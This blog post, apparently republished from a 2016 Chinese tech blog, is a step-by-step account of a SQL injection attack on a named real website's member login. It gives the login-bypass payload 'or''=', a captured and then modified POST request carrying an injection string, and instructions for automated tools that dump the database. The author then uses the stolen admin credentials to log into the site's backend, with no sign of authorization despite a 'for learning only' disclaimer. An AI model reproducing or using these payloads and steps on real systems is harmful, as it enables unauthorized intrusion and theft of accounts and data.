# 记一次SQL注入实战 - 文章 - 伯乐在线
原文出处： [左昱_leftshine](http://www.cnblogs.com/leftshine/p/5839787.html)
【2016-09-05】：刚发现漏洞时，我就已经成功实现了注入，因为怕发到网上后被玩坏，一直没有发布。今天去看了看，原网页已经无法访问了，现在发出来应该就没有什么大问题了。
## **本文仅供学习交流，目的是为了构建更加安全的网络环境！**
**注入地址**
某VIP会员专用系统 [http://www.tcmpv.com/index.php/Home/Public/login.html](http://www.tcmpv.com/index.php/Home/Public/login.html)
## 相关工具
注入工具：
超级SQL注入工具【SSQLInjection】http://www.shack2.org/article/1417357815.html
明小子
抓包工具：
Wireshark
## 注入过程
**1.测试漏洞**
**1)测试 ‘**
首先打开网页，如下图：
![](http://jbcdn2.b0.upaiyun.com/2016/09/9c5953bad8b0519e33630f934d44a798.png)
一看这种很low的系统就有可能存在漏洞
废话不多说，输入单引号” ‘ “进行测试：
![](http://jbcdn2.b0.upaiyun.com/2016/09/10d84ea25efc510891a13dfb6ca303ea.png)
输入单引号
![](http://jbcdn2.b0.upaiyun.com/2016/09/253f586a9ad719a97c455a13a5043e54.png)
测试结果
看到测试结果报数据库错误，这就证明该系统存在SQL注入漏洞。而且这些粗心的程序猿连数据库表名都直接暴露出来了（tp_login）,这不就等于直接写着：
**“我有漏洞，欢迎注入！”**
**2)测试 ‘or”=’**
进一步测试，输入” ‘or”=’ “，点确定，直接就登录成功了，如下图
![](http://jbcdn2.b0.upaiyun.com/2016/09/d68fc80568143c4b4748997e41f61b7e.png)
输入” ‘or”=’ “，点确定
![](http://jbcdn2.b0.upaiyun.com/2016/09/87d992992d5db7253c2900b83698c514.png)
登录成功
不用密码，直接进去了，看来漏洞真的存在！
**3)测试 3389′ and 1=1 and ‘a’=’a**
接下来测试下能不能使用注入语句，这里有两个选择：
- 继续使用or语句
- 找到真实密码
or语句前面已经有说明，这里就以知道密码的情况作说明（or语句原理相同）
网页上直接给出了获取密码的方式：
![](http://jbcdn2.b0.upaiyun.com/2016/09/9560ef0702ca91c0315a51438ebcf81d.png)
加群，拿到密码：3389
构造新的注入语句：” 3389′ and 1=1 and ‘a’=’a “，测试：
![](http://jbcdn2.b0.upaiyun.com/2016/09/13615f78538de9bde120d8723b6bd1f8.png)
再次成功登入，确认可以进行注入攻击。
接下来就可以对数据库进行数据库名（前面提到，登录错误信息中已经包含了数据库名”tp_login”，真是省事啊）、表名、列名……的猜测了
手动猜测的具体方法可以参考这里：
[sql注入实例分析](http://www.cnblogs.com/leftshine/p/SQLInjection.html)（[http://www.cnblogs.com/leftshine/p/SQLInjection.html](http://www.cnblogs.com/leftshine/p/SQLInjection.html)）
当然手动猜测的量太大了，这么劳神费力的事当然要交给程序来完成，不过还是强烈建议看看这篇文章来了解下SQL注入的基本原理，不然后面操作一片茫然。
**2.构造数据包**
因为该系统不能简单通过网页URL来传递信息，所以我们需要构造数据包以POST方式发送数据包来注入。
**1)手动构造：**
根据POST数据包结构手动构造一个用于注入的数据包，具体怎么构造那就要去好好学习网络协议了……
**2)抓包构造**
这就简单多了，我们直接抓取正常发送的数据包，加以改造就可以用来注入了！
这里我们使用Wireshark来抓包，关于Wireshark抓取与分析HTTP包，参考这里：[应用层协议FTP、DNS协议、HTTP协议分析](http://www.cnblogs.com/leftshine/p/5698890.html)（[http://www.cnblogs.com/leftshine/p/5698890.html](http://www.cnblogs.com/leftshine/p/5698890.html)）
使用Wireshark抓取到的POST数据包内容如下：
> 
POST /index.php/Home/Public/do_login.html HTTP/1.1
Host: www.tcmpv.com
Connection: keep-alive
Content-Length: 8
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://www.tcmpv.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://www.tcmpv.com/index.php/Home/Public/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=*****************************; uid=11; num=1; time=2016-07-30+10%3A55%3A47; a7207_pages=22; a7207_times=1
key=3389
修改成注入使用的POST包：
> 
POST /index.php/Home/Public/do_login.html HTTP/1.1
Referer: http://www.tcmpv.com/index.php/Home/Public/login.html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 8
Host: www.tcmpv.com
Connection: Keep-Alive
Pragma: no-cache
Cookie: PHPSESSID=*****************************; uid=11; num=1; time=2016-07-30+10%3A55%3A47; a7207_pages=22; a7207_times=1
key=3389%’)#inject##
这个数据包可以由软件”超级SQL注入工具”根据上面的包自动生成，具体操作请参考软件压缩包中相应的使用说明。
**3.注入**
![](http://jbcdn2.b0.upaiyun.com/2016/09/9ff8c36cc96215ba5c8d62735859cee8.png)
其实我们只要将抓取到的数据包粘进程序中，然后点击”自动识别”，软件就会自动进行相应配置，然后看情况改改就可以了（一般情况下，自动配置就可以搞定了）。
配置完后，点击”发送数据”验证当前配置的数据包是否符合条件，若能够正确返回网页信息，则配置可用：
![](http://jbcdn2.b0.upaiyun.com/2016/09/6dc80afb81513132e60dcb21836caf26.png)
正确返回网页信息
虽然图中显示”登录失败”，但证明可以正确返回网页信息，配置可用！
**4.获取数据库信息**
点击获取数据
![](http://jbcdn2.b0.upaiyun.com/2016/09/7c14b91614371f6fa0d483af93802179.png)
获取数据
然后转到数据中心，依次”获取库”、”获取表”、”获取列”、”获取数据”：
![](http://jbcdn2.b0.upaiyun.com/2016/09/c2c731dead4230bec055ecf3f02c8b41.png)
数据库信息一览无余
可以看到，确实有名为”tp_login”的表和”3389″这个密码。
接下来就可以随心所欲的获取数据了。
## 获取到的数据
获取到的管理员账号信息：
![](http://jbcdn2.b0.upaiyun.com/2016/09/6c8e0fb07f6b7a08fb39ae794ecfa676.png)
管理员账号信息
有了管理员账号信息，如何使用呢？上第二个软件：”明小子”，其实它本身就是一个注入工具，不知道是不是年代太久远了……好多功能不实用。这里我们只用到”管理入口扫描”功能，如下图：
![](http://jbcdn2.b0.upaiyun.com/2016/09/f2655da67d37c453b3b9d802f172e17f.png)
管理入口扫描
获取到了4个链接，挨个打开看，发现这个可以用：
[http://www.tcmpv.com/index.php/Admin/Public/login.html](http://www.tcmpv.com/index.php/Admin/Public/login.html)
![](http://jbcdn2.b0.upaiyun.com/2016/09/ca4da36750338870e3e3f9530e3ad817.png)
管理员登录
输入账号密码，登录
![](http://jbcdn2.b0.upaiyun.com/2016/09/cd9293f86ea279ddc98f8f17481a1570.png)
登录成功
登录成功，看到笑脸真是开心！
![](http://jbcdn2.b0.upaiyun.com/2016/09/acfff82ee28c76b22f72c1a1d5d47530.png)
成功进入后台
成功进入管理后台，发现并没有什么价值的信息，倒是有很多某视频网站的VIP账号，也不造这些万人骑的账号能不能用……
至此，整个SQL注入成功完成！
